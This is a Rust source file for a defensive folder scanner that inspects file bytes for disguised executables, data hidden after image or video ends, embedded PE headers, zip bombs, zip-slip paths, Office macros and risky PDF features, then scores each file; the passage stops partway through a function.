//! Folder scan - the RUST half.
//!
//! The user picks a folder on the "Scan" page. This file:
//!   1. walks the folder (documents, videos, images, archives, scripts - everything),
//!   2. looks at the BYTES of every file without running or opening it in any program:
//!        - real file type from the first bytes (a ".jpg" that is really an .exe),
//!        - data hidden AFTER the end of an image / video (PNG, JPEG, GIF, BMP, MP4),
//!        - PNG text + private chunks, JPEG comments, GIF comments,
//!        - Windows programs (MZ/PE) buried inside a file,
//!        - ZIP structure read from the central directory only (zip bombs, "zip slip"
//!          paths, double extensions, macros inside Office files) - nothing is unpacked here,
//!        - dangerous PDF features (/JavaScript, /OpenAction, /Launch, ...),
//!   3. sends what it found to Python (backend/scan/filescan.py), which decodes hidden pixel
//!      data, reads script text, looks inside archives (with limits) and asks VirusTotal,
//!   4. keeps the job + results in memory for the dashboard (GET /api/filescan/status).
//!
//! If Python is not running the Rust findings are still reported ("rust-only").

use crate::state::AppState;
use std::sync::Arc as ArcShared;
type Shared = ArcShared<AppState>;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

const MAX_FILES: usize = 1_000_000; // a whole drive
const MAX_DEPTH: usize = 48;
const FULL_READ: u64 = 64 * 1024 * 1024; // files up to this size are read completely
const EDGE: usize = 8 * 1024 * 1024; // bigger files: only the first and last 8 MB are read
const MAX_HASH: u64 = 2 * 1024 * 1024 * 1024;
const MAX_RESULTS: usize = 3000;
const MAX_VT_LOOKUPS: usize = 20; // VirusTotal free keys allow 4 lookups a minute
const PREVIEW: usize = 6000; // characters of hidden data shown in the dashboard

// ------------------------------------------------------------------ result types

#[derive(Serialize, Deserialize, Clone)]
pub struct Finding {
    pub id: String,
    pub severity: String, // critical | high | medium | low
    pub title: String,
    pub detail: String,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Hidden {
    #[serde(rename = "where", default)]
    pub place: String, // e.g. "after the end of the PNG image"
    pub offset: u64,
    pub length: u64,
    pub kind: String, // text | pe | zip | script | binary ...
    pub text: String, // decoded text, or a hex dump for binary data
}

#[derive(Serialize, Clone)]
pub struct FileResult {
    pub at: String, // when it was checked
    pub path: String,
    pub name: String,
    pub size: u64,
    pub sha256: String,
    pub kind: String,
    pub verdict: String, // clean | suspicious | malicious
    pub score: u32,
    pub findings: Vec<Finding>,
    pub hidden: Vec<Hidden>,
    pub zip: Option<Value>,
    pub vt: Option<Value>,
    pub analysis: String, // "python" | "rust-only"
    pub note: String,
}

#[derive(Serialize, Clone)]
pub struct Job {
    pub id: String,
    pub path: String,
    pub status: String, // running | done | cancelled | error
    pub started: String,
    pub finished: String,
    pub total: usize,
    pub scanned: usize,
    pub current: String,
    pub clean: usize,
    pub suspicious: usize,
    pub malicious: usize,
    pub skipped: usize,
    pub truncated: bool,
    pub error: String,
    pub items: Vec<FileResult>,
}

struct Cell {
    job: Mutex<Job>,
    cancel: AtomicBool,
}

/// What the user chose on the Scan page.
#[derive(Default, Clone)]
pub struct Opts {
    pub recursive: bool,
    /// only these extensions (lower-case, no dot). Empty = every file.
    pub extensions: Vec<String>,
    /// folders to skip: a full path, or a folder name that is skipped wherever it appears.
    pub exclude: Vec<String>,
}

#[derive(Default)]
pub struct Store {
    jobs: Mutex<Vec<Arc<Cell>>>,
    /// newest first: every new file the download monitor has looked at
    monitor: Mutex<Vec<FileResult>>,
}

impl Store {
    pub fn new() -> Self {
        Store::default()
    }
    fn latest(&self, id: Option<&str>) -> Option<Arc<Cell>> {
        let jobs = self.jobs.lock().unwrap_or_else(|e| e.into_inner());
        match id {
            Some(id) => jobs.iter().find(|c| c.job.lock().map(|j| j.id == id).unwrap_or(false)).cloned(),
            None => jobs.last().cloned(),
        }
    }
    pub fn status(&self, id: Option<&str>) -> Option<Job> {
        self.latest(id).map(|c| c.job.lock().unwrap_or_else(|e| e.into_inner()).clone())
    }
    pub fn cancel(&self, id: &str) -> bool {
        match self.latest(Some(id)) {
            Some(c) => {
                c.cancel.store(true, Ordering::SeqCst);
                true
            }
            None => false,
        }
    }
    pub fn monitor_items(&self) -> Vec<FileResult> {
        self.monitor.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }
    fn running(&self) -> bool {
        let jobs = self.jobs.lock().unwrap_or_else(|e| e.into_inner());
        jobs.iter().any(|c| c.job.lock().map(|j| j.status == "running").unwrap_or(false))
    }
}

fn finding(id: &str, sev: &str, title: impl Into<String>, detail: impl Into<String>) -> Finding {
    Finding { id: id.into(), severity: sev.into(), title: title.into(), detail: detail.into() }
}

/// Same weights as backend/scan/filescan.py, used when Python is not available.
fn score_of(f: &[Finding]) -> u32 {
    f.iter()
        .map(|x| match x.severity.as_str() {
            "critical" => 70,
            "high" => 40,
            "medium" => 20,
            _ => 5,
        })
        .sum::<u32>()
        .min(100)
}
fn verdict_of(score: u32) -> &'static str {
    if score >= 60 {
        "malicious"
    } else if score >= 20 {
        "suspicious"
    } else {
        "clean"
    }
}

// ------------------------------------------------------------------ file type from the first bytes

fn u16be(b: &[u8]) -> usize {
    ((b[0] as usize) << 8) | b[1] as usize
}
fn u32be(b: &[u8]) -> usize {
    ((b[0] as usize) << 24) | ((b[1] as usize) << 16) | ((b[2] as usize) << 8) | b[3] as usize
}
fn u16le(b: &[u8]) -> u64 {
    b[0] as u64 | (b[1] as u64) << 8
}
fn u32le(b: &[u8]) -> u64 {
    b[0] as u64 | (b[1] as u64) << 8 | (b[2] as u64) << 16 | (b[3] as u64) << 24
}
fn u64le(b: &[u8]) -> u64 {
    u32le(b) | u32le(&b[4..]) << 32
}

const SCRIPT_EXT: &[&str] = &["ps1", "psm1", "bat", "cmd", "vbs", "vbe", "js", "jse", "hta", "wsf", "sh", "bash", "py", "php", "pl", "rb"];

/// "png", "jpeg", "gif", "bmp", "webp", "zip", "pdf", "ole", "pe", "elf", "rar", "7z", "gz", "mp4", "avi", "mkv",
/// "script", "text" or "binary".
pub fn sniff(head: &[u8], ext: &str) -> &'static str {
    let h = head;
    let starts = |m: &[u8]| h.len() >= m.len() && &h[..m.len()] == m;
    if starts(b"\x89PNG\r\n\x1a\n") {
        "png"
    } else if starts(b"\xff\xd8\xff") {
        "jpeg"
    } else if starts(b"GIF87a") || starts(b"GIF89a") {
        "gif"
    } else if starts(b"BM") && h.len() > 14 && ext == "bmp" {
        "bmp"
    } else if starts(b"RIFF") && h.len() >= 12 {
        match &h[8..12] {
            b"WEBP" => "webp",
            b"AVI " => "avi",
            _ => "riff",
        }
    } else if starts(b"PK\x03\x04") || starts(b"PK\x05\x06") || starts(b"PK\x07\x08") {
        "zip"
    } else if starts(b"%PDF") {
        "pdf"
    } else if starts(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1") {
        "ole"
    } else if starts(b"MZ") && h.len() > 0x40 {
        "pe"
    } else if starts(b"\x7fELF") {
        "elf"
    } else if starts(b"Rar!") {
        "rar"
    } else if starts(b"7z\xbc\xaf\x27\x1c") {
        "7z"
    } else if starts(b"\x1f\x8b") {
        "gz"
    } else if starts(b"\x1a\x45\xdf\xa3") {
        "mkv"
    } else if h.len() >= 12 && &h[4..8] == b"ftyp" {
        "mp4"
    } else {
        text_kind(h, ext)
    }
}

fn text_kind(h: &[u8], ext: &str) -> &'static str {
    let n = h.len().min(2048);
    if n == 0 {
        return "binary";
    }
    // UTF-16 text (PowerShell ISE saves like this)
    let utf16 = h.len() > 4 && ((h[0] == 0xff && h[1] == 0xfe) || (h[0] == 0xfe && h[1] == 0xff));
    let texty = utf16 || h[..n].iter().filter(|&&b| b == 0).count() == 0 && h[..n].iter().filter(|&&b| b < 9 || (b > 13 && b < 32)).count() * 50 < n;
    if !texty {
        return "binary";
    }
    let low: String = String::from_utf8_lossy(&h[..n]).to_lowercase();
    let scripty = SCRIPT_EXT.contains(&ext)
        || low.starts_with("#!")
        || low.contains("<script")
        || low.contains("<?php")
        || low.starts_with("@echo off")
        || low.contains("powershell");
    if scripty {
        "script"
    } else {
        "text"
    }
}

/// What kind of file does this extension promise? (None = we do not check)
fn expected_kind(ext: &str) -> Option<&'static str> {
    Some(match ext {
        "png" => "png",
        "jpg" | "jpeg" | "jfif" => "jpeg",
        "gif" => "gif",
        "bmp" => "bmp",
        "webp" => "webp",
        "pdf" => "pdf",
        "zip" | "docx" | "xlsx" | "pptx" | "docm" | "xlsm" | "pptm" | "jar" | "apk" | "odt" | "ods" | "odp" | "epub" => "zip",
        "doc" | "xls" | "ppt" | "msg" => "ole",
        "mp4" | "m4v" | "mov" | "m4a" => "mp4",
        "avi" => "avi",
        "mkv" | "webm" => "mkv",
        "exe" | "dll" | "scr" | "sys" | "ocx" | "cpl" => "pe",
        "7z" => "7z",
        "rar" => "rar",
        "gz" | "tgz" => "gz",
        _ => return None,
    })
}

const IMAGE_KINDS: &[&str] = &["png", "jpeg", "gif", "bmp", "webp"];

// ------------------------------------------------------------------ hidden data helpers

struct Cand {
    place: String,
    offset: u64,
    data: Vec<u8>,
}

/// printable text if the bytes look like text, otherwise a hex dump of the first 96 bytes.
fn preview(data: &[u8]) -> (String, &'static str) {
    let n = data.len().min(PREVIEW);
    let printable = data[..n].iter().filter(|&&b| b == 9 || b == 10 || b == 13 || (32..127).contains(&b)).count();
    let kind = sniff(&data[..data.len().min(64)], "");
    if n > 0 && printable * 100 / n >= 85 {
        (String::from_utf8_lossy(&data[..n]).into_owned(), if kind == "script" { "script" } else { "text" })
    } else {
        let hex: Vec<String> = data.iter().take(96).map(|b| format!("{b:02x}")).collect();
        (hex.join(" "), if kind == "text" { "binary" } else { kind })
    }
}

fn png_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
    const STD: &[&str] = &[
        "IHDR", "PLTE", "IDAT", "IEND", "tRNS", "cHRM", "gAMA", "iCCP", "sBIT", "sRGB", "cICP", "mDCV", "cLLI", "bKGD", "hIST", "pHYs",
        "sPLT", "eXIf", "tIME", "iTXt", "tEXt", "zTXt", "acTL", "fcTL", "fdAT", "oFFs", "pCAL", "sCAL", "sTER", "dSIG",
    ];
    let mut c = Vec::new();
    let mut pos = 8usize;
    while pos + 12 <= b.len() {
        let len = u32be(&b[pos..]);
        let typ = String::from_utf8_lossy(&b[pos + 4..pos + 8]).into_owned();
        let end = pos.saturating_add(12).saturating_add(len);
        if end > b.len() {
            return (None, c);
        }
        let data = &b[pos + 8..pos + 8 + len];
        if (typ == "tEXt" || typ == "iTXt") && len > 24 {
            c.push(Cand { place: format!("PNG text chunk ({typ})"), offset: pos as u64 + 8, data: data[..len.min(8192)].to_vec() });
        } else if !STD.contains(&typ.as_str()) && len >= 32 {
            c.push(Cand { place: format!("PNG private chunk '{typ}'"), offset: pos as u64 + 8, data: data[..len.min(8192)].to_vec() });
        }
        if typ == "IEND" {
            return (Some(end), c);
        }
        pos = end;
    }
    (None, c)
}

fn jpeg_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
    let mut c = Vec::new();
    let mut i = 2usize;
    while i + 4 <= b.len() {
        if b[i] != 0xff {
            return (None, c);
        }
        let m = b[i + 1];
        if m == 0xff {
            i += 1;
            continue;
        }
        if m == 0xd9 {
            return (Some(i + 2), c);
        }
        if m == 0x01 || m == 0xd8 || (0xd0..=0xd7).contains(&m) {
            i += 2;
            continue;
        }
        let len = u16be(&b[i + 2..]);
        if len < 2 || i + 2 + len > b.len() {
            return (None, c);
        }
        if m == 0xfe && len > 20 {
            c.push(Cand { place: "JPEG comment".into(), offset: i as u64 + 4, data: b[i + 4..i + 2 + len.min(8194)].to_vec() });
        }
        if m == 0xda {
            // compressed picture data runs until the next real marker
            let mut j = i + 2 + len;
            loop {
                if j + 1 >= b.len() {
                    return (None, c);
                }
                if b[j] == 0xff && b[j + 1] != 0 && b[j + 1] != 0xff && !(0xd0..=0xd7).contains(&b[j + 1]) {
                    break;
                }
                j += 1;
            }
            i = j;
            continue;
        }
        i += 2 + len;
    }
    (None, c)
}

fn gif_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
    let mut c = Vec::new();
    if b.len() < 14 {
        return (None, c);
    }
    let mut i = 13usize;
    if b[10] & 0x80 != 0 {
        i += 3 * (1usize << ((b[10] & 7) + 1));
    }
    while i < b.len() {
        match b[i] {
            0x3b => return (Some(i + 1), c),
            0x21 => {
                let label = *b.get(i + 1).unwrap_or(&0);
                i += 2;
                let mut text = Vec::new();
                loop {
                    let Some(&n) = b.get(i) else { return (None, c) };
                    i += 1;
                    if n == 0 {
                        break;
                    }
                    let n = n as usize;
                    if i + n > b.len() {
                        return (None, c);
                    }
                    text.extend_from_slice(&b[i..i + n]);
                    i += n;
                }
                if label == 0xfe && text.len() > 20 {
                    c.push(Cand { place: "GIF comment".into(), offset: i as u64 - text.len() as u64, data: text });
                }
            }
            0x2c => {
                if i + 10 > b.len() {
                    return (None, c);
                }
                let p = b[i + 9];
                i += 10;
                if p & 0x80 != 0 {
                    i += 3 * (1usize << ((p & 7) + 1));
                }
                i += 1;
                loop {
                    let Some(&n) = b.get(i) else { return (None, c) };
                    i += 1;
                    if n == 0 {
                        break;
                    }
                    i += n as usize;
                }
            }
            _ => return (None, c),
        }
    }
    (None, c)
}

/// MP4 / MOV: walk the top-level boxes; whatever follows the last valid box is not part of the video.
fn mp4_end(f: &mut File, total: u64) -> Option<u64> {
    let mut pos = 0u64;
    while pos + 8 <= total {
        f.seek(SeekFrom::Start(pos)).ok()?;
        let mut h = [0u8; 16];
        let got = f.read(&mut h).ok()?;
        if got < 8 {
            return Some(pos);
        }
        let size = u32be(&h) as u64;
        if !h[4..8].iter().all(|b| (32..127).contains(b)) {
            return Some(pos);
        }
        let sz = match size {
            0 => total - pos,
            1 if got >= 16 => u64be(&h[8..16]),
            1 => return None,
            n => n,
        };
        if sz < 8 {
            return Some(pos);
        }
        if pos + sz > total {
            return None; // truncated video - cannot tell
        }
        pos += sz;
    }
    Some(pos)
}
fn u64be(b: &[u8]) -> u64 {
    (u32be(b) as u64) << 32 | u32be(&b[4..]) as u64
}

fn find_all(hay: &[u8], needle: &[u8], limit: usize) -> Vec<usize> {
    let mut out = Vec::new();
    if needle.is_empty() || hay.len() < needle.len() {
        return out;
    }
    let first = needle[0];
    let mut i = 0usize;
    while i + needle.len() <= hay.len() && out.len() < limit {
        if hay[i] == first && &hay[i..i + needle.len()] == needle {
            out.push(i);
        }
        i += 1;
    }
    out
}

fn count_sub(hay: &[u8], needle: &[u8]) -> usize {
    find_all(hay, needle, 100_000).len()
}

/// Windows programs hidden inside another file: "MZ" followed by a valid PE header.
fn embedded_pe(buf: &[u8], base: u64) -> Vec<u64> {
    let mut hits = Vec::new();
    for p in find_all(buf, b"MZ", 200_000) {
        if p == 0 || p + 0x40 > buf.len() {
            continue;
        }
        let lfanew = u32le(&buf[p + 0x3c..]) as usize;
        if (0x40..0x1000).contains(&lfanew) && p + lfanew + 4 <= buf.len() && &buf[p + lfanew..p + lfanew + 4] == b"PE\0\0" {
            hits.push(base + p as u64);
            if hits.len() >= 5 {
                break;
            }
        }
    }
    hits
}

// ------------------------------------------------------------------ ZIP: central directory only

fn zip_scan(f: &mut File, total: u64, ext: &str) -> (Vec<Finding>, Option<Value>) {
    let mut out = Vec::new();
    let tail_len = total.min(66_000 + 22 + 20 + 56) as usize;
    let mut tail = vec![0u8; tail_len];
    if f.seek(SeekFrom::Start(total - tail_len as u64)).is_err() || f.read_exact(&mut tail).is_err() {
        return (out, None);
    }
    let Some(e) = find_all(&tail, b"PK\x05\x06", 1000).last().copied() else {
        out.push(finding("zip-no-eocd", "medium", "Broken ZIP structure", "The end-of-archive record is missing, so this archive cannot be read normally. Damaged or deliberately malformed archives are used to confuse scanners."));
        return (out, None);
    };
    if e + 22 > tail.len() {
        return (out, None);
    }
    let (mut entries, mut cd_size, mut cd_off) = (u16le(&tail[e + 10..]), u32le(&tail[e + 12..]), u32le(&tail[e + 16..]));
    if (entries == 0xffff || cd_off == 0xffff_ffff || cd_size == 0xffff_ffff) && e >= 20 && &tail[e - 20..e - 16] == b"PK\x06\x07" {
        let z64 = u64le(&tail[e - 12..]);
        let mut rec = [0u8; 56];
        if f.seek(SeekFrom::Start(z64)).is_ok() && f.read_exact(&mut rec).is_ok() && &rec[..4] == b"PK\x06\x06" {
            entries = u64le(&rec[32..]);
            cd_size = u64le(&rec[40..]);
            cd_off = u64le(&rec[48..]);
        }
    }
    if cd_size > 256 * 1024 * 1024 || cd_off.saturating_add(cd_size) > total {
        out.push(finding("zip-bad-dir", "high", "Archive directory is invalid", "The central directory points outside the file. The file is corrupt or built to crash unpackers."));
        return (out, None);
    }
    let mut cd = vec![0u8; cd_size as usize];
    if f.seek(SeekFrom::Start(cd_off)).is_err() || f.read_exact(&mut cd).is_err() {
        return (out, None);
    }

    let (mut n, mut comp_sum, mut uncomp_sum, mut max_ratio, mut max_ratio_size) = (0u64, 0u64, 0u64, 0f64, 0u64);
    let (mut nested, mut encrypted, mut has_vba, mut has_content_types) = (0u64, 0u64, false, false);
    let (mut exec, mut traversal, mut dbl, mut names): (Vec<String>, Vec<String>, Vec<String>, Vec<String>) = Default::default();
    let mut p = 0usize;
    while p + 46 <= cd.len() && &cd[p..p + 4] == b"PK\x01\x02" && n < 2_000_000 {
        let flags = u16le(&cd[p + 8..]);
        let (mut csz, mut usz) = (u32le(&cd[p + 20..]), u32le(&cd[p + 24..]));
        let (nl, xl, cl) = (u16le(&cd[p + 28..]) as usize, u16le(&cd[p + 30..]) as usize, u16le(&cd[p + 32..]) as usize);
        if p + 46 + nl + xl + cl > cd.len() {
            break;
        }
        let name = String::from_utf8_lossy(&cd[p + 46..p + 46 + nl]).into_owned();
        if usz == 0xffff_ffff || csz == 0xffff_ffff {
            let mut x = &cd[p + 46 + nl..p + 46 + nl + xl];
            while x.len() >= 4 {
                let (id, sz) = (u16le(x), u16le(&x[2..]) as usize);
                if x.len() < 4 + sz {
                    break;
                }
                if id == 1 {
                    let mut d = &x[4..4 + sz];
                    if usz == 0xffff_ffff && d.len() >= 8 {
                        usz = u64le(d);
                        d = &d[8..];
                    }
                    if csz == 0xffff_ffff && d.len() >= 8 {
                        csz = u64le(d);
                    }
                }
                x = &x[4 + sz..];
            }
        }
        n += 1;
        comp_sum = comp_sum.saturating_add(csz);
        uncomp_sum = uncomp_sum.saturating_add(usz);
        if csz > 0 {
            let r = usz as f64 / csz as f64;
            if r > max_ratio {
                max_ratio = r;
                max_ratio_size = usz;
            }
        } else if usz > 1024 * 1024 {
            max_ratio = f64::INFINITY;
            max_ratio_size = usz;
        }
        if flags & 1 != 0 {
            encrypted += 1;
        }
        let low = name.to_lowercase();
        let leaf = low.rsplit(['/', '\\']).next().unwrap_or("");
        let leaf_ext = leaf.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
        if low.contains("../") || low.contains("..\\") || low.starts_with('/') || low.starts_with('\\') || low.as_bytes().get(1) == Some(&b':') {
            if traversal.len() < 5 {
                traversal.push(name.clone());
            }
        }
        if ["zip", "7z", "rar", "gz", "tar", "jar", "cab", "iso"].contains(&leaf_ext) {
            nested += 1;
        }
        if ["exe", "dll", "scr", "msi", "bat", "cmd", "ps1", "vbs", "vbe", "js", "jse", "wsf", "hta", "lnk", "com", "cpl", "sh"].contains(&leaf_ext) && exec.len() < 8 {
            exec.push(name.clone());
        }
        if leaf.matches('.').count() >= 2
            && ["exe", "scr", "bat", "cmd", "com", "js", "vbs", "lnk", "ps1", "hta"].contains(&leaf_ext)
            && ["pdf", "doc", "docx", "xls", "xlsx", "jpg", "jpeg", "png", "txt", "mp4", "zip"].iter().any(|d| leaf.contains(&format!(".{d}.")))
            && dbl.len() < 5
        {
            dbl.push(name.clone());
        }
        if leaf == "vbaproject.bin" {
            has_vba = true;
        }
        if low == "[content_types].xml" {
            has_content_types = true;
        }
        if names.len() < 40 {
            names.push(name);
        }
        p += 46 + nl + xl + cl;
    }

    let ratio = if comp_sum > 0 { uncomp_sum as f64 / comp_sum as f64 } else { 0.0 };
    let mib = |v: u64| format!("{:.1} MB", v as f64 / 1_048_576.0);
    if uncomp_sum >= 1 << 30 && ratio >= 100.0 || max_ratio >= 1000.0 && max_ratio_size >= 100 * 1024 * 1024 {
        out.push(finding(
            "zip-bomb", "critical", "Zip bomb",
            format!("{} compressed would expand to {} (ratio {}:1). Unpacking it fills the disk or crashes the program that opens it. Do not extract.", mib(comp_sum), mib(uncomp_sum), if ratio.is_finite() { ratio as u64 } else { 0 }),
        ));
    } else if uncomp_sum >= 100 * 1024 * 1024 && ratio >= 100.0 {
        out.push(finding("zip-ratio", "medium", "Unusually high compression", format!("{} expands to {} ({}:1). Probably a bomb or a very repetitive file; check before extracting.", mib(comp_sum), mib(uncomp_sum), ratio as u64)));
    }
    if comp_sum > total.saturating_add(total / 10) + 1024 && n > 1 {
        out.push(finding("zip-overlap", "critical", "Overlapping archive entries (zip bomb)", format!("The entries claim {} of compressed data but the file is only {}. Entries share the same bytes - the trick used by zip bombs that expand without nesting.", mib(comp_sum), mib(total))));
    }
    if n > 100_000 {
        out.push(finding("zip-many", "medium", "Huge number of entries", format!("{n} entries. Can exhaust memory or disk when extracted.")));
    }
    if nested > 0 && ratio >= 30.0 {
        out.push(finding("zip-nested", "medium", "Archives inside the archive", format!("{nested} nested archive(s) with a high compression ratio - the layout of a recursive zip bomb.")));
    }
    if !traversal.is_empty() {
        out.push(finding("zip-slip", "high", "Path traversal in file names (zip-slip)", format!("Entries try to write outside the extraction folder: {}", traversal.join(", "))));
    }
    if !dbl.is_empty() {
        out.push(finding("zip-doubleext", "high", "Program disguised as a document", format!("Double extension: {}", dbl.join(", "))));
    }
    let office = has_content_types || ["docx", "xlsx", "pptx", "docm", "xlsm", "pptm"].contains(&ext);
    if has_vba {
        let macro_ext = ext.ends_with('m');
        out.push(finding(
            "office-macro", if macro_ext { "medium" } else { "high" }, "Office file contains macros (vbaProject.bin)",
            if macro_ext { "Macro-enabled document. Macros are the most common way documents install malware.".to_string() } else { format!(".{ext} files cannot contain macros, but this one carries a VBA project. Treat as hostile.") },
        ));
    } else if !office && !exec.is_empty() {
        out.push(finding("zip-exec", "medium", "Archive contains programs or scripts", exec.join(", ")));
    }
    if encrypted > 0 {
        out.push(finding("zip-encrypted", "low", "Password-protected entries", format!("{encrypted} entr{} cannot be inspected. Malware is often sent in encrypted zips to bypass scanners.", if encrypted == 1 { "y" } else { "ies" })));
    }
    let info = json!({
        "entries": n, "compressed": comp_sum, "uncompressed": uncomp_sum, "ratio": if ratio.is_finite() { ratio } else { 0.0 },
        "nested": nested, "encrypted": encrypted, "executables": exec, "office": office, "macros": has_vba, "names": names,
    });
    (out, Some(info))
}

// ------------------------------------------------------------------ one file

struct Local {
    kind: String,
    findings: Vec<Finding>,
    hidden: Vec<Hidden>,
    zip: Option<Value>,
}

fn read_samples(f: &mut File, total: u64) -> std::io::Result<(Vec<u8>, bool)> {
    if total <= FULL_READ {
        let mut v = Vec::with_capacity(total as usize);
        f.seek(SeekFrom::Start(0))?;
        f.take(total).read_to_end(&mut v)?;
        return Ok((v, false));
    }
    let mut v = vec![0u8; EDGE];
    f.seek(SeekFrom::Start(0))?;
    f.read_exact(&mut v)?;
    let mut t = vec![0u8; EDGE];
    f.seek(SeekFrom::Start(total - EDGE as u64))?;
    f.read_exact(&mut t)?;
    v.extend_from_slice(&t);
    Ok((v, true))
}

fn trailing_check(f: &mut File, end: u64, total: u64, what: &str, kind: &str, fnd: &mut Vec<Finding>, hid: &mut Vec<Hidden>) {
    if end >= total {
        return;
    }
    let len = total - end;
    let take = len.min(PREVIEW as u64 * 2) as usize;
    let mut data = vec![0u8; take];
    if f.seek(SeekFrom::Start(end)).is_err() || f.read_exact(&mut data).is_err() {
        return;
    }
    if data.iter().all(|b| matches!(b, 0 | 9 | 10 | 13 | 32)) && len < 64 {
        return; // trailing newline / padding
    }
    let tk = sniff(&data[..data.len().min(64)], "");
    let (text, pk) = preview(&data);
    let sev = match tk {
        "pe" | "elf" | "zip" | "ole" | "rar" | "7z" | "gz" => "critical",
        _ if pk == "script" => "high",
        _ if pk == "text" => "medium",
        _ if len > 1024 => "medium",
        _ => "low",
    };
    let title = match tk {
        "pe" => format!("Windows program hidden after the end of the {what}"),
        "elf" => format!("Linux program hidden after the end of the {what}"),
        "zip" | "rar" | "7z" | "gz" => format!("Archive hidden after the end of the {what}"),
        "ole" => format!("Office document hidden after the end of the {what}"),
        _ if pk == "script" => format!("Script appended after the end of the {what}"),
        _ if pk == "text" => format!("Text appended after the end of the {what}"),
        _ => format!("{len} bytes of unknown data after the end of the {what}"),
    };
    fnd.push(finding(
        "trailing-data", sev, title,
        format!("{kind} viewers stop at the end of the picture/video, so extra bytes here (offset {end}, {len} bytes) are invisible to the user but can be read by malware that knows where to look."),
    ));
    hid.push(Hidden { place: format!("after the end of the {what}"), offset: end, length: len, kind: if pk == "binary" { tk.into() } else { pk.into() }, text });
}

fn local_scan(path: &Path, total: u64) -> Result<Local, String> {
    let mut f = File::open(path).map_err(|e| e.to_string())?;
    let ext = path.extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default();
    let (buf, partial) = read_samples(&mut f, total).map_err(|e| e.to_string())?;
    let kind = sniff(&buf[..buf.len().min(4096)], &ext).to_string();
    let (mut fnd, mut hid, mut zip) = (Vec::new(), Vec::new(), None);

    // 1) does the extension tell the truth?
    if let Some(exp) = expected_kind(&ext) {
        let same = exp == kind || (exp == "avi" && kind == "riff") || (exp == "mp4" && kind == "mp4");
        if !same {
            let hostile = matches!(kind.as_str(), "pe" | "elf" | "script");
            let both_images = IMAGE_KINDS.contains(&exp) && IMAGE_KINDS.contains(&kind.as_str());
            if hostile && exp != "pe" {
                fnd.push(finding("disguised", "critical", format!("Disguised: named .{ext} but it is really a {}", match kind.as_str() { "pe" => "Windows program", "elf" => "Linux program", _ => "script" }),
                    "The file name suggests a harmless document, picture or video, but the content is executable. This is a classic way to trick people into running malware."));
            } else if kind == "zip" && exp != "zip" {
                fnd.push(finding("disguised", "high", format!("Named .{ext} but it is really an archive"), "The content is a ZIP archive, not what the extension says."));
            } else if !both_images && kind != "text" && kind != "binary" {
                fnd.push(finding("ext-mismatch", "low", format!("Extension .{ext} does not match the content ({kind})"), "Usually a renamed file; harmless on its own."));
            }
        }
    }

    // 2) structure of the file
    let mut cands: Vec<Cand> = Vec::new();
    #[allow(unused_assignments)]
    let mut image_end: Option<u64> = None;
    if !partial {
        let (end, c) = match kind.as_str() {
            "png" => png_scan(&buf),
            "jpeg" => jpeg_scan(&buf),
            "gif" => gif_scan(&buf),
            "bmp" if buf.len() > 6 => {
                let sz = u32le(&buf[2..]);
                (if sz >= 14 && sz <= total { Some(sz as usize) } else { None }, vec![])
            }
            _ => (None, vec![]),
        };
        cands = c;
        image_end = end.map(|e| e as u64);
        if IMAGE_KINDS.contains(&kind.as_str()) && image_end.is_none() && matches!(kind.as_str(), "png" | "jpeg" | "gif") {
            fnd.push(finding("image-truncated", "low", "Image structure is damaged", "The image ends abruptly or has an invalid structure; some tools cannot tell where hidden data would start."));
        }
        if let Some(e) = image_end {
            trailing_check(&mut f, e, total, &format!("{kind} image").to_uppercase().replace("IMAGE", "image"), &kind.to_uppercase(), &mut fnd, &mut hid);
        }
    } else if kind == "mp4" {
        if let Some(e) = mp4_end(&mut f, total) {
            trailing_check(&mut f, e, total, "video", "MP4", &mut fnd, &mut hid);
        }
    }
    for c in cands {
        let (text, k) = preview(&c.data);
        hid.push(Hidden { place: c.place, offset: c.offset, length: c.data.len() as u64, kind: k.into(), text });
    }

    match kind.as_str() {
        "zip" => {
            let (zf, zi) = zip_scan(&mut f, total, &ext);
            fnd.extend(zf);
            zip = zi;
        }
        "pdf" => {
            let n = |t: &[u8]| count_sub(&buf, t);
            let (js, jsl, oa, aa, launch, emb, rich) = (n(b"/JavaScript"), n(b"/JS"), n(b"/OpenAction"), n(b"/AA"), n(b"/Launch"), n(b"/EmbeddedFile"), n(b"/RichMedia"));
            if launch > 0 {
                fnd.push(finding("pdf-launch", "high", "PDF can launch programs (/Launch)", "A /Launch action starts an external program when the PDF is opened."));
            }
            if js + jsl > 0 {
                let auto = oa + aa > 0;
                fnd.push(finding("pdf-js", if auto { "high" } else { "medium" }, if auto { "PDF runs JavaScript automatically" } else { "PDF contains JavaScript" },
                    format!("{} JavaScript marker(s){}. Scripts inside PDFs are used to exploit readers and to download malware.", js + jsl, if auto { " with an automatic /OpenAction" } else { "" })));
            }
            if emb > 0 {
                fnd.push(finding("pdf-embedded", "medium", "PDF has embedded files", format!("{emb} embedded file(s) can hide programs or documents inside the PDF.")));
            }
            if rich > 0 {
                fnd.push(finding("pdf-rich", "low", "PDF has embedded media (RichMedia)", "Flash-era feature, rarely legitimate today."));
            }
        }
        _ => {}
    }

    // 3) Windows programs buried inside a file that should not contain any
    if !matches!(kind.as_str(), "pe" | "elf" | "zip" | "rar" | "7z" | "gz" | "script" | "text") {
        let hits = if partial {
            let mut h = embedded_pe(&buf[..EDGE], 0);
            h.extend(embedded_pe(&buf[EDGE..], total - EDGE as u64));
            h
        } else {
            embedded_pe(&buf, 0)
        };
        if !hits.is_empty() && !hid.iter().any(|h| h.kind == "pe") {
            let off = hits[0];
            fnd.push(finding("embedded-pe", "critical", "Windows program embedded inside the file", format!("A complete executable header (MZ/PE) was found at byte {off}. A normal {kind} file never contains one.")));
            let take = if partial { 0 } else { off as usize };
            let data = if partial { Vec::new() } else { buf[take..buf.len().min(take + 96)].to_vec() };
            let hex: Vec<String> = data.iter().map(|b| format!("{b:02x}")).collect();
